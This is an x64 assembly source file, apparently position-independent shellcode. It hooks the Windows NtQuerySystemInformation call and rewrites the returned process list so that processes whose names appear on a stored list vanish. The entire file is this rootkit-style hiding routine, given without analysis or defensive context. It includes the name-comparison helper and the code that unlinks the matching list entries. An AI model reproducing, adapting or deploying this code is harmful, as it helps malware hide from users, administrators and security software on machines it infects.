[bits 64]
    push r15                ; store r15
    sub rsp, 8              ; 16 byte stack align
    call reloc_base         ; get reloc_base on the stack
reloc_base:
    pop r15                 ; reloc base in r15
    sub r15, 11             ; offset of the size of the opcode of the instr above
 
jmp main

; arg0: str             rcx
; arg1: wstr            rdx
;
; ret: 1 if equal       rax
utils_strcmpAW:
    push rbp
    mov rbp, rsp

    mov [rbp + 16], rcx             ; str
    mov [rbp + 24], rdx             ; wstr

    ; rbp - 8 = return value
    ; rbp - 16 = rsi
    ; rbp - 24 = rdi
    ; rbp - 32 = 8 bytes padding
    sub rsp, 32                     ; allocate local variable space

    mov qword [rbp - 8], 0          ; return value
    mov [rbp - 16], rsi             ; save rsi
    mov [rbp - 24], rdi             ; save rdi

    mov rsi, [rbp + 16]             ; str
    mov rdi, [rbp + 24]             ; wstr

.loop:
    movzx eax, byte [rsi]
    movzx edx, byte [rdi]

    cmp al, dl
    jne .loop_end_not_equal

    cmp al, 0                       ; end of string ?
    je .loop_end_equal

    inc qword rsi
    add rdi, 2
    jmp .loop

    .loop_end_equal:
        mov qword [rbp - 8], 1      ; return value

        jmp .shutdown

    .loop_end_not_equal:
        mov qword [rbp - 8], 0      ; return value
        jmp .shutdown

.shutdown:
    mov rdi, [rbp - 24]         ; restore rdi
    mov rsi, [rbp - 16]         ; restore rsi
    mov rax, [rbp - 8]           ; return value

    leave
    ret

; arg0: SystemInformationClass      rcx
; arg1: SystemInformation           rdx
; arg2: SystemInformationLength     r8
; arg3: ReturnLength                r9
;
; ret:  NTSTATUS                    rax
main:
        push rbp
        mov rbp, rsp

        mov [rbp + 32], rcx
        mov [rbp + 40], rdx
        mov [rbp + 48], r8
        mov [rbp + 56], r9

        ; rbp - 8 = return value
        ; rbp - 16 = current sys proc info
        ; rbp - 24 = prev sys proc info
        ; rbp - 32 = proc name index
        ; rbp - 40 = r12
        ; rbp - 48 = padding bytes
        sub rsp, 48                     ; local variable space
        sub rsp, 32                     ; shadow space

        mov qword [rbp - 8], 0          ; return value
        mov qword [rbp - 32], 0         ; proc name index
        mov [rbp - 40], r12             ; store r12

        ; call ntQuerySystemInformation
        mov rcx, [rbp + 32]
        mov rdx, [rbp + 40]
        mov r8, [rbp + 48]
        mov r9, [rbp + 56]
        call [r15 + params + 168]       ; ntQuerySystemInformation

        mov [rbp - 8], rax              ; return value

        cmp rax, 0
        jne .shutdown

        cmp qword [rbp + 32], 5         ; SystemProcessInformationEnum
        jne .shutdown
       
        cmp qword [rbp + 40], 0         ; SystemProcessInformation == 0
        je .shutdown

        mov rax, [rbp + 40]             ; SystemProcessInformation
        mov [rbp - 16], rax             ; current sys proc info

        mov qword [rbp - 24], 0         ; next sys proc info

    .sys_proc_info_loop:
        cmp qword [rbp - 16], 0         ; curr == NULL
        je .shutdown

        mov r12, [rbp - 16]             ; current sys proc info
        add r12, 56                     ; sys proc info.ImageName

        cmp word [r12], 0               ; imageName.Length == 0
        je .end_proc_name_loop

        add r12, 8                      ; imagName.Buffer
        cmp qword [r12], 0                    ; imageName.Buffer == 0
        je .end_proc_name_loop

        .proc_name_loop:
            mov rax, [rbp - 32]         ; proc name index
            mov rcx, 8
            mul rcx                     ; proc name offset in rax

            mov rcx, r15
            add rcx, params
            add rcx, 8
            add rcx, rax
            mov rdx, [r12]
            call utils_strcmpAW

            cmp rax, 1                  ; are strings equal
            jne .proc_name_check_continue

            mov rdx, [rbp - 24]         ; prev sys proc info
            mov rcx, [rbp - 16]         ; cur sys proc info
            mov rcx, [rcx]
            add [rdx], rcx

        .proc_name_check_continue:

            inc qword [rbp - 32]        ; proc name index

            mov rax, [r15 + params]     ; proc name count
            cmp [rbp - 32], rax         ; proc name index == proc name count

            jne .proc_name_loop

        mov qword [rbp - 32], 0         ; reset proc count index

    .end_proc_name_loop:
        mov rax, [rbp - 16]             ; current sys proc info
        mov eax, [rax]                  ; current sys proc info.nextEntry
        cmp eax, 0                      ; current sys proc info.nextEntryOffset == 0
        je .shutdown

        mov rcx, [rbp - 16]             ; curren sys proc info
        mov [rbp - 24], rcx             ; prev = current
        add [rbp - 16], rax             ; current += next entry offset
        jmp .sys_proc_info_loop

    .shutdown:

        mov r12, [rbp - 40]             ; restore r12
        mov rax, [rbp - 8]              ; return value

        leave
        add rsp, 8
        pop r15
        ret

ntstr: db 'ntstr', 0

align 16
params:
; procNameCount             0
; procNames 8 * 20          8
; ntquerysysteminformation  168
; outputDebugStringA        176
